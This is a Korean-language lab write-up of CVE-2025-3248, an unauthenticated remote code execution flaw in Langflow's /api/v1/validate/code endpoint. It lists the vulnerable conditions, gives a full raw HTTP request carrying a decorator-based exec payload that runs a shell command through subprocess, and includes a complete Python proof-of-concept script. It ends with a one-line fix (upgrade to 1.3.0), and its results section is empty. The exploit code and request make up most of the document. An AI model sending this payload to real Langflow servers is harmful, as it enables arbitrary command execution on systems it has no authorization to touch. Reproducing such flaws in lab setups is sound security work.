# CVE-2025-3248 Langflow API

### 1. 취약점 요약 
Langflow의 /api/v1/validate/code 엔드포인트에서 인증 미흡으로 임의 코드 실행이 가능한 취약점이다.

### 2. 환경 구성 
다음 명령어를 실행하면 취약한 환경구성과 poc.py까지 자동으로 실행된다.
```
docker compose up -d
```

### 3. 취약 조건 
취약한 조건은 다음과 같다.
- Langflow 버전이 1.3.0 미만
- 인증되지 않은 사용자가 /api/v1/validate/code 엔드포인트에 접근 가능해야 함

### 4. 재현 절차 
`http://your-id:7860/api/v1/validate/code`에 POST 방식으로 다음과 같은 악의적인 요청을 보낸다.
```
POST /api/v1/validate/code HTTP/1.1
Host: localhost:7860
sec-ch-ua-platform: "macOS"
Accept-Language: ko-KR,ko;q=0.9
Accept: application/json, text/plain, */*
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Content-type:application/json
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 111

{"code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"}

```

### 5. PoC 코드
poc.py는 POST 요청으로 `/api/v1/validate/code` 엔드포인트에 악의적인 요청을 보낸다.
```
import os
import requests

target_url = os.getenv("TARGET_URL", "http://web:7860").rstrip("/")
url = f"{target_url}/api/v1/validate/code"

data = {
    "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"
}

print(f"[*] Sending PoC request to {url}")

response = requests.post(url, json=data, timeout=15)

print(f"[*] HTTP {response.status_code}")

try:
    print(response.json())
except requests.exceptions.JSONDecodeError:
    print(response.text)

```

### 6. 실행 결과


### 7. 대응 방안
Langflow 1.3.0 이상의 버전으로 업데이트를 한다.
